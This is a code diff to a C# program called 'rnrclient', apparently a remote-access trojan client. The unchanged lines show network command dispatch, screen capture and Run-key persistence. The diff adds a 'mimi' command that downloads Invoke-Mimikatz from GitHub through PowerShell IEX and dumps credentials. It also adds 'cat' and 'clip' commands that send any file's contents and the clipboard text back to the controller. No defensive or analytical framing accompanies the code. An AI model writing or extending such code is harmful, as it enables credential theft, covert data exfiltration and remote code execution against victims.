@@ -132,6 +132,18 @@ namespace rnrclient
                     {
                         //persist();
                     }
+                    else if (args[0] == "mimi")
+                    {
+                        mimikatz();
+                    }
+                    else if (args[0] == "cat")
+                    {
+                        send(cat(args[1]));
+                    }
+                    else if (args[0] == "clip")
+                    {
+                        send(clip());
+                    }
                     else if (args[0] == "exit")
                     {
                         stream.Close();
@@ -315,6 +327,10 @@ namespace rnrclient
         {
             System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
         }
+        static string cat(string path)
+        {
+            return System.IO.File.ReadAllText(path);
+        }
         static void screencap(string dest)
         {
             Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
@@ -350,6 +366,18 @@ namespace rnrclient
         {
             var split = Environment.CommandLine.Split();
             Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", split[0]);
+        }
+        static void mimikatz()
+        {
+            string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
+            ProcessStartInfo psinfo = new ProcessStartInfo("powershell.exe");
+            psinfo.WindowStyle = ProcessWindowStyle.Normal;
+            psinfo.Arguments = args;
+            Process.Start(psinfo);
+        }
+        static string clip()
+        {
+            return System.Windows.Forms.Clipboard.GetText();
         }
         static string help()
         {
